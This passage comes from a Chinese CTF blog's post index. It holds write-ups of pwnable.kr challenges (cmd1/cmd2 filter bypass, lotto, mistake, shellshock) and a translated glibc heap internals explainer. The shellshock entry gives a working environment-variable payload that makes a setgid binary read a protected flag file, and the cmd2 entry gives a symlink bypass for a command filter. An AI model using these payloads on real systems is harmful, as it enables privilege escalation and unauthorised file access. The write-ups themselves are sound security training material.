strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;&#125; cmd2在cmd1的基础上，加强了过滤操作。这里$=、PATH、export、/、$`$、flag$都不可以用。 下面介绍一种方法： 思路分析创建linux软链接方法如下： 12ln -s [源文件或目录][目标文件或目录]# 这里如果当前文件夹下不存在该目标文件，会自动创建，软链接相当于windows的快捷方式 首先在/tmp目录下建立自己的目录xiaohong404(这个目录可以任意取名，但不能和已经存在的文件名重复），然后创建目录/tmp/xiaohong404/c。那么，如果在/tmp/xiaohong404/c目录下执行pwd命令就可以得到这个路径字符”/tmp/xiaohong404/c“。然后在/tmp/exploit目录下构造cat的软链接ln -s /bin/cat cat，在/tmp/exploit/c下建立flag的软链接ln -s /home/cmd2/flag flag。然后在/tmp/exploit/c下执行命令/home/cmd2/cmd2”$(pwd)at f*，这里表示执行cmd2程序，相当于./cmd2 “$(pwd)at f*“就可以得到flag了。其原理就是利用”$(pwd)at”构造出/tmp/xiaohong404/cat命令。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"cmd1","slug":"PWN/Pwnable_kr/cmd1","date":"2020-10-20T02:01:26.000Z","updated":"2020-10-20T07:26:42.000Z","comments":true,"path":"2020/10/20/PWN/Pwnable_kr/cmd1/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/20/PWN/Pwnable_kr/cmd1/","excerpt":"","text":"查看cmd1.c源代码 putenv函数是添加或者改变一个环境变量。 filter函数的作用是通过strstr函数匹配$flag、sh、tmp$三个字符串，如果检测到这三个字符串，则函数返回值不为0，会导致主函数退出，无法执行system函数。所以这里需要将我们输入的字符串隐藏起来，绕过filter函数的检查，但这里我们需要得到flag。又不能直接输入flag，于是想到可以使用通配符来代替flag。system命令的默认PWD环境变量应该是与这个程序的PWD环境变量相同，这个环境变量是什么，就是默认“./”执行的文件夹目录，一般是根据程序调用的bash窗口目录来的。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"lotto","slug":"PWN/Pwnable_kr/lotto","date":"2020-10-19T12:56:14.000Z","updated":"2020-10-20T00:50:22.000Z","comments":true,"path":"2020/10/19/PWN/Pwnable_kr/lotto/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/19/PWN/Pwnable_kr/lotto/","excerpt":"","text":"查看lotto.c源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123; int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; // win! if(match == 6)&#123; system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;bad luck...\\n&quot;); &#125;&#125;void help()&#123; printf(&quot;- nLotto Rule -\\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\\n&quot;); printf(&quot;for more details, follow the link below\\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do? method=playerGuide#buying_guide01\\n\\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;);&#125;int main(int argc, char* argv[])&#123; // menu unsigned int menu; while(1)&#123; printf(&quot;- Select Menu -\\n&quot;); printf(&quot;1. Play Lotto\\n&quot;); printf(&quot;2. Help\\n&quot;); printf(&quot;3. Exit\\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu)&#123; case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\\n&quot;); return 0; default: printf(&quot;invalid menu\\n&quot;); break; &#125; &#125; return 0;&#125; 程序的大致逻辑为，用户输入6个字符，如果与系统中/dev/urandom随机生成的数相同，累计可以达到6分则最后可拿到flag。显然，需要寻找措施进行绕过，重点在于play函数。 查看play函数 判断用户输入的字符和随机数是否相同本应该是一重for循环，而这里使用了两重for循环，判断的是要求的每一位只要我们输入的6位中存在就可以了，不管是哪一位都可以，只要有六个相等就好了。那只需要一直尝试同一个字符串，总有一次人品好。另外，注意这里随机生成的字符ASCII码范围为1~45，参照ASCII码表，只有 DEC 33 开始才是可见字符，所以需要输入的字符为 ASCII DEC 33 到 45 。 PWN可以编写python脚本，也可以直接自己多次重复输入。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"blackjack","slug":"PWN/Pwnable_kr/blackjack","date":"2020-10-19T00:54:25.000Z","updated":"2020-11-04T08:52:52.000Z","comments":true,"path":"2020/10/19/PWN/Pwnable_kr/blackjack/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/19/PWN/Pwnable_kr/blackjack/","excerpt":"","text":"思路分析本题链接打不开了！！！ 只能参考别人的wp 有两个比较关键的点 判断用户下注的金额如果大于用户拥有的金额，则会提示用户不能下注，但程序的漏洞在于如果输入的金额是负数，会直接通过，并且返回输入的下注金额。 如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"coin","slug":"PWN/Pwnable_kr/coin","date":"2020-10-18T13:26:46.000Z","updated":"2020-10-19T07:09:48.000Z","comments":true,"path":"2020/10/18/PWN/Pwnable_kr/coin/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/","excerpt":"","text":"使用netcat连接上远程的服务器 题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。 思路分析简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行： 1234567891011121314151617181920212223242526272829303132333435from pwn import *import rep = remote(&#x27;localhost&#x27;, 9007)print(p.recv())for i in range(100): N, C = re.findall(&quot;N=(\\d+) C=(\\d+)&quot;, p.recv())[0] N = int(N) C = int(C) print(N, C) start, end = 0, N-1 while start &lt;= end and C &gt; 0: mid = (start + end) // 2 x = &quot; &quot;.join([str(j) for j in range(start, mid+1)]) # build range list p.sendline(x) res = int(p.recvline()[:-1]) if res % 10 == 0: start = mid+1 # through first half else: end = mid-1 # through second half C -= 1 while C &gt; 0: # use all the tries p.sendline(&quot;0&quot;) p.recv(1024) C -= 1 p.sendline(str(start)) # final answer print(p.recv())print(p.recv()) 注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"shellshock","slug":"PWN/Pwnable_kr/shellshock","date":"2020-10-18T06:00:22.000Z","updated":"2020-10-19T07:10:16.000Z","comments":true,"path":"2020/10/18/PWN/Pwnable_kr/shellshock/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/shellshock/","excerpt":"","text":"查看shellshock.c源文件 程序依次运行三个函数setresuid、setresgid、system 查看程序的执行权限 以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用的是effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。 这个组权限对于flag文件来说是可读的（r–），但是问题在于这一段程序并没有涉及对flag的读操作，权限虽然有了，但怎么办呢？显然这里利用shellshock漏洞。可通过下面的命令证明确实存在shellshock漏洞： 1env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; ./bash -c &quot;echo this is a test&quot; 实际上，“x=’() { :;}; echo vulnerable”​是new出来了一个新的环境变量： 12KEY=xVALUE=() &#123;:;&#125;; echo vulnerable 而当我们后续执行bash的时候，最终会定位到initialize_shell_variables中，这个函数内部会遍历所有的环境变量，而我们设计的VALUE绕过了其中一个export函数的定义检查，使得最终执行的是后面的echo vulnerable串。所以，调用bash的时候，自定义的这个语句就会触发。简而言之，这个漏洞会把用户输入的指令当作代码执行。 于是，我们在这条语句的基础上将自定义语句换为bash -c “cat ./flag”，执行的程序bash -c换成./shellshock(它内部调用了bash -c ‘echo shock_me’)，因此当执行shellshock中的system函数会调用bash，总而自动执行cat flag这条命令，因为./shellshock执行时拿到了shellshock_pwn的权限，从而破壳漏洞可以在此权限上成功执行了cat ./flag，即成功实现了提权操作。 PWN运行下面语句拿到flag 1env x=&#x27;() &#123; :;&#125;; bash -c &quot;cat ./flag&quot;&#x27; ./shellshock 关于shellshock漏洞相关知识可参考： 1、关于ShellShock漏洞的利用过程和原理解析 - CSDN博客 2、破壳（ShellShock）漏洞样本分析报告","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"mistake","slug":"PWN/Pwnable_kr/mistake","date":"2020-10-18T05:13:53.000Z","updated":"2020-10-19T07:10:04.000Z","comments":true,"path":"2020/10/18/PWN/Pwnable_kr/mistake/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/","excerpt":"","text":"查看mistake.c源文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123; printf(&quot;can&#x27;t open password %d\\n&quot;, fd); return 0; &#125; printf(&quot;do not bruteforce...\\n&quot;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf(&quot;read error\\n&quot;); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf(&quot;input password : &quot;); scanf(&quot;%10s&quot;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf(&quot;Password OK\\n&quot;); system(&quot;/bin/cat flag\\n&quot;); &#125; else&#123; printf(&quot;Wrong Password\\n&quot;); &#125; close(fd); return 0;&#125; 整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。 思路分析最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示operator priority，因此审查源代码中存在两个运算符以上的语句： 这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下： 1if((fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400)) &lt; 0) 而另一方面，0作为文件描述符，它指向的是stdin。 因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"Heap II","slug":"PWN/Heap/Heap-II","date":"2020-10-17T13:32:43.000Z","updated":"2020-11-09T05:11:00.000Z","comments":true,"path":"2020/10/17/PWN/Heap/Heap-II/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/17/PWN/Heap/Heap-II/","excerpt":"","text":"原版传送门 UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION前一部分解释了malloc和free的基本行为。我们看到，malloc通过分配内存块来处理内存分配请求。每个块不仅存储程序员将与之交互的malloc返回的“用户数据”区域，还存储与该块关联的元数据。 我们看到了堆管理器的基本块分配策略是如何工作的，并且看到了当没有已经释放的块可以被用于响应用户的请求时，如何从堆的顶部创建新块。 接下来这篇文章，将解释这种块回收策略是如何工作的，即如何将已经分配的块被free然后保存起来，并最终回收以服务之后的malloc请求。许多堆利用技术都依赖于这些内部机制，但是现在，让我们看看堆正确运行时如何通过free回收这些块。 HOW DOES FREE WORK?当程序员完成malloc的分配块的任务（或malloc兼容的分配，如calloc）后，程序员将通过free将其释放回堆管理器。在C标准定义了free（NULL）什么也不做，但对于所有其他free调用，堆管理器的第一份工作是使指针指回其相应的块。堆管理器通过从传递给free的指针中减去该块元数据的大小来实现此目的。 从指针到块的这种转换之所以有效，是因为用户数据区域位于块内，但是，仅当传递给free的指针确实来自malloc的实时分配时，该转换才有效。如果将其他一些指针传递给free，则堆管理器可能释放或回收无效的块，从而导致内存损坏问题，这可能导致进程崩溃，甚至可能使黑客远程接管该进程。 因此，free首先进行了一些基本的检查，检查是否这个释放的块是显然无效的，防止之后再分配。如果其中任何一个检查失败，则程序中止。检查包括： 检查分配是否在8字节（或64位为16字节）边界上对齐，因为malloc确保所有分配都对齐。 检查块的大小字段是否可能，因为它可能太小，太大，或者没有对齐字节，还是因为它与进程地址空间的末尾重叠。 检查块位于arena的边界内。 通过检查位于下一个块开头的元数据中的相应“ P”位，检查该块是否尚未标记为空闲。 这里的堆管理器检查并不详尽。攻击者控制的指向数据的指针可能会绕过这些完整性检查，并且仍会在进程中触发内存崩溃。我们将在以后的文章中更详细地介绍这一点。 FREE CHUNK METADATA在上一篇文章中，展示了已分配块如何将元数据与程序员使用的“用户数据”区域一起存储。这些已经分配的块存储了“块大小”以及其元数据中的三个位，分别称为“ A”，“ M”和“ P”。这些位可分别帮助堆管理器记住该块是否是从非主arena分配的，是否是通过mmap进行堆外分配的，以及前一个块是否是空闲的。 空闲块也存储元数据。类似已分配的块，他们存储“块大小”，“A”和“P”字段，但他们不使用“M”字段，因为一个MMAP过的块在释放期间将永远是munmap-ed（取消虚拟内存映射），而不是转变成一个free块回收，即空闲块的”M“字段是一个确定的值，一定不会通过mmap从堆外分配。 空闲块还使用称为“边界标签”的技术在用户数据区域之后存储信息。这些边界标签在块之前和之后携带大小信息。这允许从任何已知的块开始并在任何方向上遍历块，从而能够非常快速地合并相邻的空闲块。 这些释放的块存储在相应的”free bins“中，这些“free bins”用作链表。这要求每个空闲块还存储指向其他块的指针。由于释放的块中的“用户数据”（根据定义）是免费供堆管理器使用的，因此堆管理器将释放的块中的“用户数据”区域重新定位为额外的元数据所在的位置。 RECYCLING MEMORY WITH BINS在内部，堆管理器需要记录释放的块，以便malloc可以在分配请求期间重用它们。在最初的实现中，堆管理器可以通过将所有释放的块简单地存储在某个巨大的链表中来完成此操作。这可以工作，但是会使malloc变慢。由于malloc是大多数程序的高利用率组件，因此这种缓慢将对系统上运行的程序的整体性能产生巨大影响。 为了提高性能，堆管理器而是维护一系列称为“ bins”的列表，这些列表旨在最大程度地提高分配和释放的速度。共有5种类型bins：每个线程62 small bins, 63 large bins, 1 unsorted bin, 10 fast bins and 64 tcache bins 。 small，large，unsorted bins是最古老的bin类型，其实现这里将其称为堆的基本回收策略。fast bins和tcache bins是在这些基础上的优化。 容易混淆的地方在于，在堆管理器的源代码中，small，large，unsorted bins都一起存在同一数组中。索引0没有被使用，索引1是unsorted bin，2-64是small bins，65-127是large bins。 CHUNK RECYCLING: THE BASIC STRATEGY在tcache和fastbin优化之前，首先来看一下堆管理器使用的基本回收策略。 free的基本算法如下（低地址在前，高地址在后）： 如果块在元数据中设置了M位，则分配是在堆外分配的，则应该被munmap。 否则，如果该块之前的块是空闲的，则将之前的块向后合并以创建更大的空闲块。 同样，如果此块之后的块是空闲的，则将之后的块将向前合并以创建更大的空闲块。 如果这个之后可能更大的块与堆的“顶部”相邻，则整个块将被存储到堆的末端，而不是存储在“ bin”中。 否则，该块将被标记为空闲并将其放置在适当的bin中。 SMALL BINSsmall bins是最容易理解的基本bin。它们有62个，每个small bin都存储相同大小的固定块。在32位系统上小于512字节（在64位系统上小于1024字节）的每个块都有一个对应的small bin。由于每个small bin仅存储一个特定大小的块，它们会自动排序，因此在这些列表中插入和删除条目的速度非常快。 LARGE BINSsmall bins的策略非常适合小型分配，但是我们无法为每个可能的块大小都设置一个存储区。对于超过512字节（64位为1024字节）的块，堆管理器将改为使用large bins。 63个large bins中的每个大都与small bins以相同的方式运行，但是它们不是存储固定大小的块，而是存储一定大小范围内的块。每个large bins的大小范围都设计为与small bins的块大小或其他large bins的范围不重叠。换句话说，在给定块的大小的情况下，恰好只有一个对应于此大小的small bin或large bin。 由于large bins存储一定大小范围的块，因此向large bin中插入一个块必须手动进行排序，并且从链表中的分配也需要遍历该列表。这使得large bins本质上比small bins慢。但是，在大多数程序中，large bins的使用频率较低。这是因为平均意义上说，程序更倾向于以更高的频率分配（或释放）小的分配块。出于相同的原因，large bins的使用频率会聚集在覆盖范围较小的large bin中；最小的large bin仅覆盖从512字节到576字节的64字节范围的块，而第二大的large bin则覆盖256KB的大小范围的块。最大的large bin覆盖了1MB以上的所有已释放块。 UNSORTED BIN堆管理器使用称为unsorted bins的优化缓存层面进一步改善了基本的分配算法。此优化基于以下观察结果：通常这些free的块都聚集在一起，并且释放后通常立即分配大小相似的块。例如，释放树或列表的程序通常会一次释放大多数分配空间中的所有条目，或者更新列表中条目的程序可能会释放前一个条目，然后再分配新的空间替换条目。 在这些情况下，在将较大的块放入正确的bin中之前合并这些释放的块将避免一些开销，并且在分配过程中能够快速返回最近释放的块将简单地加快整个过程。 因此堆管理器引入了unsorted bin，当一个块释放时，堆管理器没有立即将新释放的块放入相应的bin中，而是与相邻的块合并，然后将其转储到常规的unsorted的链表中。在malloc期间，将检查unsorted bins上的每个项目，以查看其是否“适合“请求。如果大小匹配，malloc可以立即使用它。如果没有匹配的块，则malloc之后会将块放入其相应的small bins或large bins中。 FAST BINSfast bins是在之前看到的三个基本bin基础上的进一步优化。这些bins实际上将最近释放的小块保留在“fast-turnaround queue”中，并且在块被释放之后不将其与相邻的块合并，使得这些块始终保持活跃状态，以便在释放后不久若有匹配该块大小的malloc请求，可以立即重新利用该块。 像small bins一样，每个fast bins仅负责单个固定大小的块。有10个这样的fast bins，覆盖大小为16、24、32、40、48、56、64、72、80和88字节的块以及块元数据。 与small bins不同，fast bins的块永远不会与相邻的块合并。实际上，这是堆管理器不会在下一个块的开头设置“ P”位的方式。换句话说，在概念上可以认为，堆管理器不会“真正”释放fast bins中的块。 和small bins相同的部分在于，fast bins也仅覆盖固定的大小的块，并且会自动排序分类，因此插入和删除的速度也非常快。而且，由于fast-binned的块永远不会合并，因此它们只需要被存储在单链表，而不需要存储在双向链表中，因为其不存在合并块时从列表中进行删除的操作。 当然，fast bin的缺点是，fast bin块不会“真正”释放或合并，最终会导致进程的内存空间随着时间的流逝而碎片化和膨胀。为了解决这个问题，堆管理器会定期“合并”堆。通过“实际释放”它（即将其与相邻的空闲块合并），并将生成的空闲块放置到unsorted bins上，以供malloc之后使用，从而“刷新”fast bins中的每个条目。 每当释放任何大于64KB的块（其中64KB为近似值 ），或用户发出大于fast bin可以处理的malloc请求（即对于32位中512字节以上的块或64位中1024字节以上的块）时，或者当程序调用malloc_trim或mallopt时，都会发生“合并”阶段。 TCACHE (PER-THREAD CACHE) BINS堆管理器用来加快分配速度的最终优化是每个线程进行缓存或“ tcache”分配器。首先让我们看一下tcache试图解决的问题。 假如一个计算机系统上的每个进程都同时运行一个或多个线程。多线程允许一个进程执行多个并发操作。例如，一个大容量的Web服务器可能同时具有多个传入请求，并且该Web服务器可能让每个传入请求都在自己的线程上进行服务，而不是让每个请求都排成一队等待服务。 给定进程中的每个线程共享相同的地址空间，也就是说，每个线程可以在内存中看到相同的代码和数据。每个线程都有自己的寄存器和堆栈来存储临时局部变量，但是诸如全局变量和堆之类的资源在所有线程之间共享。 协调访问诸如堆之类的全局资源是一个复杂的话题，它出错可能导致一个称为“race condition”的问题，这会导致难以调试的崩溃，通常也可被黑客利用。 假设在一个线程上提供服务的Web请求尝试更新数据库某一行，而另一个并发Web请求尝试从同一行读取。通常，我们将要确保第二个线程永远不会看到中间写入的值，但因为它正被另一个线程覆盖使用，从而第二个线程可能看到部分或损坏形式的行数据。数据库通过使读写操作看起来像原子操作来解决此问题：如果两个线程试图同时访问同一行，则必须先完成一个操作，然后才能开始下一个操作。解决这些竞争条件的一种非常常见的方法是通过使用锁，使其他同时访问全局资源的请求强制进入顺序队列。 通常，锁是通过一个线程在其使用之前“标记”它拥有全局资源的所有权，然后执行其操作，然后标记该资源不再使用来进行锁定的。如果出现另一个线程并希望使用该资源并看到其他线程正在使用该资源，则该线程将等待，直到另一个线程完成。这样可以确保全局资源一次仅由一个线程使用。但这带来了成本：正在等待资源的线程停滞并浪费时间。这称为“lock contention”（锁争用）。 对于许多全局变量，这个开销还可以接受。但是对于所有线程都在不断使用的堆，此开销会很快导致整个程序的速度变慢。 堆管理器主要通过为每个线程创建自己的arena解决这个问题，直到达到arena分配数目的阈值。此外，tcache 中per-thread cache的目的是减少锁本身的成本，因为锁指令开销很大，并且最终会占用”fast-path“中很大一部分执行时间。此功能已添加到glibc 2.26中的malloc内存分配功能中，并且默认情况下启用。 Per-thread caching通过准备好小块的per-thread bins来加快分配速度。这样，当线程请求一个块时，如果该线程在其tcache上有一个块可用，则它可以为分配提供服务，而不必等待堆锁。 默认情况下，每个线程都有64个单链接的tcache bins。每个bin最多包含7个相同大小的块，在64位系统上为24到1032字节，在32位系统上为12到516字节。 HOW DO CHUNKS END UP IN TCACHE BINS?一个块被释放后，堆管理器将查看该块是否存在与该块大小相对应的tcache容器。与fast bin一样，tcache bin 上的块被视为“正在使用”，并且不会与相邻释放的块合并。 如果匹配该块大小的tcache已满（或者该块对于tcache bin而言太大），则堆管理器将恢复到我们以前的”slow-path“策略，即获取堆锁，然后像以前一样处理该块。 相应的tcache分配策略也非常简单。如果在匹配的tcache bin上有块可用，则给定一个块请求，堆将返回该块，而不会获得堆锁。如果块对于tcache来说太大，继续采用”slow-path“策略。 在我们尝试进行分配的情况下，有一个对应的tcache bin，但如果这个bin已满，我们进行了稍微修改的分配策略。我们不只是获取堆锁并查找单个块，还获取了堆锁，并趁机将尽可能多的这种大小的块提升到tcache，（时间局部性和空间局部性）同时我们仍然保持堆锁，直到tcache bin限制为七个，并且将最后匹配的块返回给用户。 PUTTING IT ALL TOGETHER下面让我们整体回顾一下，glibc中整个malloc、free的实现的算法。 首先，每个分配的内存块是对齐的，并包含元数据以及用户区域。当程序员从堆中请求内存时，堆管理器首先计算出分配请求对应的块大小，然后按以下顺序搜索内存（这里直接考虑多线程）： 如果请求的块大小与tcache bin相匹配，并且tcache bin中有可用的块，则立即分配返回。 如果请求的块很大，则通过mmap分配堆外资源 否则，我们将获得arena heap lock，并且按照以下策略顺序执行： ​ A、尝试fast bin / small bin回收策略 如果存在相应的fast bin，尝试找到一个块匹配（同时用fast bins中的条目（如果存在匹配）预填充tcache） 否则，如果存在对应的small bin，尝试找到一个块匹配（同时预填充tcache） ​ B、解决所有延期释放块 否则，fast bin中的条目将被真正释放，并且将其合并到unsorted bin中。 遍历unsorted bin中的所有条目。如果匹配，则停止。否则，在操作时将unsorted中的条目放在其相应的small/large bin中（同时尽可能提升small bin中的条目到tcache bin） ​ C、默认回到基本回收策略 如果块大小与一个large bin相匹配，则立即搜索相应的large bin ​ D、从头创建一个新的块 否则，将没有可用的块，所以尝试从堆顶部获取一个块 如果堆的顶部空间不足，尝试使用sbrk对其进行扩展 如果遇到了地址空间的其他问题，导致堆不可以扩展，则使用mmap创建一个不连续的扩展并从那里进行分配。 ​ E、如果所有方法均失败，则返回NULL 。 以及相应的free策略： 如果指针为NULL，则C标准将该行为定义为“不执行任何操作”。 否则，通过减去块元数据的大小，将指针指回。 对块执行一些完整性检查，如果完整性检查失败，则中止。 如果该块适合放入tcache bin，则将其存储在其中。 如果该块设置了M位，则通过munmap将其返回给操作系统。 否则，我们将获得arena堆锁，然后： 如果该块适合一个fastbin，将其放在相应的fastbin上，结束。 如果块大于64KB，立即合并fastbin，然后将合并的块放入unsorted bin中。 将数据块与相邻的释放的数据块在small bin、large bin、unsorted bin中前后合并。 如果生成的块位于堆的顶部，则将其合并到堆的顶部，而不是将其存储在bin中。 否则将其存储在unsorted bin中。（Malloc稍后会做工作，将unsorted bin中的条目放入small bin或者large 